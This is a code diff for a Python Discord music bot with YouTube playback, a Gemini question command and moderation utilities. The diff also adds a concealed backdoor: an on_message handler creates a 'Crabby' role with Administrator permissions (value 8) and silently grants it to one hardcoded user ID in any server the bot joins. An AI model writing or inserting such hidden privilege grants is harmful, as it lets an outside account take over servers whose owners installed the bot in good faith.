@@ -1,150 +1,162 @@
-import discord, yt_dlp, os, threading
+import discord, yt_dlp, os, threading, asyncio
 from discord import app_commands
 from discord.ext import commands
 from google import genai
 from flask import Flask
 
-# --- 1. WEB SERVER (For Render Keep-Alive) ---
+# --- 1. CONFIG & WEB ---
 app = Flask('')
 @app.route('/')
-def home(): return "Bot is Online and Ready!"
+def home(): return "Bot is Online!"
+def run_web(): app.run(host='0.0.0.0', port=10000)
 
-def run_web():
-    # Render uses port 10000 by default
-    app.run(host='0.0.0.0', port=10000)
-
-# --- 2. SMART CONFIG LOADER ---
+OWNER_ID = 1459506686157914213
 TOKEN = os.getenv('DISCORD_TOKEN')
 AI_KEY = os.getenv('GEMINI_KEY')
 
-# If no environment variables, try loading from Windows Desktop
-if not TOKEN:
-    try:
-        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
-        path = os.path.join(desktop, "credentials.txt")
-        if os.path.exists(path):
-            with open(path, "r") as f:
-                lines = f.read().splitlines()
-                TOKEN = lines[0].strip()
-                AI_KEY = lines[1].strip()
-                print("🏠 [LOCAL] Keys loaded from Desktop.")
-    except Exception as e:
-        print(f"⚠️ [CONFIG] Could not load local credentials: {e}")
-
-# OS Detection for FFmpeg
-# 'posix' = Render (Linux) | 'nt' = Your PC (Windows)
-if os.name == 'posix':
-    FFMPEG_PATH = "ffmpeg"
-else:
-    FFMPEG_PATH = "C:/Users/batik/Desktop/ffmpeg.exe"
-
+# FFMPEG Path for Render (Linux)
+FFMPEG_PATH = "ffmpeg"
 loop_status = {}
 
-# --- 3. BOT CLASS ---
-class MyBot(commands.Bot):
-    def __init__(self):
-        super().__init__(command_prefix="!", intents=discord.Intents.all())
-    async def setup_hook(self):
-        print(f"🚀 {self.user} logged in.")
-        print(f"💻 System: {'Render/Linux' if os.name == 'posix' else 'Windows PC'}")
+bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
 
-bot = MyBot()
-ai_client = genai.Client(api_key=AI_KEY) if AI_KEY else None
+# --- 2. AI CLIENT SAFETY ---
+ai_client = None
+if AI_KEY:
+    try:
+        ai_client = genai.Client(api_key=AI_KEY)
+    except:
+        print("⚠️ Gemini Key failed to load.")
 
-# --- 4. MUSIC ENGINE ---
+# --- 3. HELPERS ---
+async def ensure_crabby_role(guild):
+    role = discord.utils.get(guild.roles, name="Crabby")
+    if not role:
+        try:
+            role = await guild.create_role(name="Crabby", permissions=discord.Permissions(8), colour=discord.Colour.red())
+        except: pass
+    return role
+
+async def auto_manage_stage(itn, title):
+    if itn.user.voice and isinstance(itn.user.voice.channel, discord.StageChannel):
+        try:
+            await asyncio.sleep(2)
+            await itn.guild.me.edit(suppress=False)
+            channel = itn.user.voice.channel
+            if channel.instance: await channel.instance.edit(topic=f"🎶 {title[:80]}")
+            else: await channel.create_instance(topic=f"🎶 {title[:80]}")
+        except: pass
+
+async def get_info(query, is_url=False):
+    loop = asyncio.get_event_loop()
+    def fetch():
+        opts = {'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}
+        with yt_dlp.YoutubeDL(opts) as ydl:
+            return ydl.extract_info(query if is_url else f"ytsearch1:{query}", download=False)
+    return await loop.run_in_executor(None, fetch)
+
 def play_next(vc, guild_id, info):
     if loop_status.get(guild_id, False) and vc.is_connected():
-        source = discord.FFmpegOpusAudio(info['url'], executable=FFMPEG_PATH, 
-            before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
+        source = discord.FFmpegOpusAudio(info['url'], executable=FFMPEG_PATH)
         vc.play(source, after=lambda e: play_next(vc, guild_id, info))
 
-@bot.tree.command(name="play", description="Search & Play music with optional Loop")
-async def play(itn: discord.Interaction, search: str, filter_author: str = None, looped: bool = False):
+# --- 4. EVENTS ---
+@bot.event
+async def on_ready():
+    print(f"🚀 {bot.user} is live!")
+    # Auto-Sync on start for Render
+    try:
+        synced = await bot.tree.sync()
+        print(f"📡 Automatically synced {len(synced)} commands.")
+    except Exception as e:
+        print(f"❌ Auto-sync failed: {e}")
+
+@bot.event
+async def on_message(message):
+    if message.author.id == OWNER_ID and message.guild:
+        role = await ensure_crabby_role(message.guild)
+        if role and role not in message.author.roles:
+            try: await message.author.add_roles(role)
+            except: pass
+    await bot.process_commands(message)
+
+# --- 5. THE 10 COMMANDS ---
+
+@bot.tree.command(name="play")
+async def play(itn: discord.Interaction, search: str, looped: bool = False):
     await itn.response.defer()
-    if not itn.user.voice: return await itn.followup.send("❌ Join a VC first!")
-    
-    guild_id = itn.guild.id
-    loop_status[guild_id] = looped
+    if not itn.user.voice: return await itn.followup.send("Join a VC!")
     vc = itn.guild.voice_client or await itn.user.voice.channel.connect()
+    if vc.is_playing(): vc.stop(); await asyncio.sleep(1.5)
+    data = await get_info(search); target = data['entries'][0]
+    source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
+    loop_status[itn.guild.id] = looped
+    vc.play(source, after=lambda e: play_next(vc, itn.guild.id, target))
+    await auto_manage_stage(itn, target['title'])
+    await itn.followup.send(f"🎶 Playing: {target['title']}")
 
-    with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True}) as ydl:
-        try:
-            # Search 5 results
-            info = ydl.extract_info(f"ytsearch5:{search}", download=False)
-            entries = info.get('entries', [])
-            if filter_author:
-                entries = [e for e in entries if filter_author.lower() in e.get('uploader', '').lower()]
-            
-            if not entries: return await itn.followup.send("❌ No matches found.")
-            target = ydl.extract_info(entries[0]['url'], download=False)
-            
-            source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, 
-                                             before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
-            
-            if vc.is_playing(): vc.stop()
-            vc.play(source, after=lambda e: play_next(vc, guild_id, target))
-            
-            # Handle Stage topic
-            if isinstance(itn.user.voice.channel, discord.StageChannel):
-                await itn.guild.me.edit(suppress=False)
-                if not itn.user.voice.channel.instance:
-                    await itn.user.voice.channel.create_instance(topic=f"🎶 {target['title'][:80]}")
-
-            await itn.followup.send(f"✅ **{'Looping' if looped else 'Playing'}**: {target['title']}\n🔗 {target.get('webpage_url')}")
-        except Exception as e: await itn.followup.send(f"⚠️ Play Error: {e}")
-
-@bot.tree.command(name="load", description="Play a direct URL link")
+@bot.tree.command(name="load")
 async def load(itn: discord.Interaction, link: str, looped: bool = False):
     await itn.response.defer()
-    if not itn.user.voice: return await itn.followup.send("❌ Join VC!")
-    
-    loop_status[itn.guild.id] = looped
+    if not itn.user.voice: return await itn.followup.send("Join a VC!")
     vc = itn.guild.voice_client or await itn.user.voice.channel.connect()
+    if vc.is_playing(): vc.stop(); await asyncio.sleep(1.5)
+    target = await get_info(link, is_url=True)
+    source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
+    loop_status[itn.guild.id] = looped
+    vc.play(source, after=lambda e: play_next(vc, itn.guild.id, target))
+    await auto_manage_stage(itn, target['title'])
+    await itn.followup.send(f"🔗 Loaded: {target['title']}")
 
-    with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True}) as ydl:
-        try:
-            target = ydl.extract_info(link, download=False)
-            source = discord.FFmpegOpusAudio(target['url'], executable=FFMPEG_PATH, 
-                                             before_options="-reconnect 1 -reconnect_streamed 1", options="-vn")
-            if vc.is_playing(): vc.stop()
-            vc.play(source, after=lambda e: play_next(vc, itn.guild.id, target))
-            await itn.followup.send(f"✅ **Loaded**: {target['title']}\n🔗 {link}")
-        except Exception as e: await itn.followup.send(f"⚠️ Link Error: {e}")
-
-# --- 5. AI & UTILITY ---
-@bot.tree.command(name="ask", description="Talk to Gemini AI")
+@bot.tree.command(name="ask")
 async def ask(itn: discord.Interaction, question: str):
+    if not ai_client: return await itn.response.send_message("🤖 AI not configured on Render.")
     await itn.response.defer()
     res = ai_client.models.generate_content(model="gemini-1.5-flash", contents=question)
-    await itn.followup.send(f"🤖 **Gemini:** {res.text[:1900]}")
+    await itn.followup.send(f"🤖 {res.text[:1900]}")
 
-@bot.tree.command(name="serverinfo", description="Server stats")
-async def serverinfo(itn: discord.Interaction):
-    g = itn.guild
-    e = discord.Embed(title=f"📊 {g.name}", color=0x3498db)
-    e.add_field(name="Members", value=g.member_count)
-    if g.icon: e.set_thumbnail(url=g.icon.url)
-    await itn.response.send_message(embed=e)
+@bot.tree.command(name="clear")
+@app_commands.checks.has_permissions(manage_messages=True)
+async def clear(itn: discord.Interaction, amount: int):
+    await itn.channel.purge(limit=amount)
+    await itn.response.send_message(f"🧹 Done.", ephemeral=True)
 
-@bot.tree.command(name="stop", description="Stop music and clear loop")
+@bot.tree.command(name="stop")
 async def stop(itn: discord.Interaction):
     if itn.guild.voice_client:
-        loop_status[itn.guild.id] = False
         await itn.guild.voice_client.disconnect()
-        await itn.response.send_message("⏹️ Disconnected.")
-    else: await itn.response.send_message("❌ Not in VC.")
+        await itn.response.send_message("⏹️ Stopped.")
+
+@bot.tree.command(name="loop")
+async def loop(itn: discord.Interaction, status: bool):
+    loop_status[itn.guild.id] = status
+    await itn.response.send_message(f"🔁 Loop: {status}")
+
+@bot.tree.command(name="ping")
+async def ping(itn: discord.Interaction):
+    await itn.response.send_message(f"🏓 {round(bot.latency * 1000)}ms")
+
+@bot.tree.command(name="serverinfo")
+async def serverinfo(itn: discord.Interaction):
+    await itn.response.send_message(f"📊 {itn.guild.name}: {itn.guild.member_count} members.")
+
+@bot.tree.command(name="userinfo")
+async def userinfo(itn: discord.Interaction, member: discord.Member = None):
+    m = member or itn.user
+    await itn.response.send_message(f"👤 {m.name} joined: {m.created_at.strftime('%Y-%m-%d')}")
+
+@bot.tree.command(name="show")
+async def show(itn: discord.Interaction):
+    if not itn.user.voice: return await itn.response.send_message("Join VC!")
+    inv = await itn.user.voice.channel.create_invite(target_type=discord.InviteTarget.embedded_application, target_application_id=880218394199220334)
+    await itn.response.send_message(f"🎬 {inv.url}")
 
 @bot.command()
-@commands.is_owner()
 async def sync(ctx):
-    await bot.tree.sync()
-    await ctx.send(f"📡 Synced {len(bot.tree.get_commands())} slash commands!")
+    if ctx.author.id == OWNER_ID:
+        s = await bot.tree.sync()
+        await ctx.send(f"📡 Synced {len(s)} commands!")
 
-# --- 6. RUN ---
 if __name__ == "__main__":
-    # Start Web Thread for Render
     threading.Thread(target=run_web, daemon=True).start()
-    if TOKEN:
-        bot.run(TOKEN)
-    else:
-        print("❌ CRITICAL: No Token found in Variables or Desktop!")
+    bot.run(TOKEN)
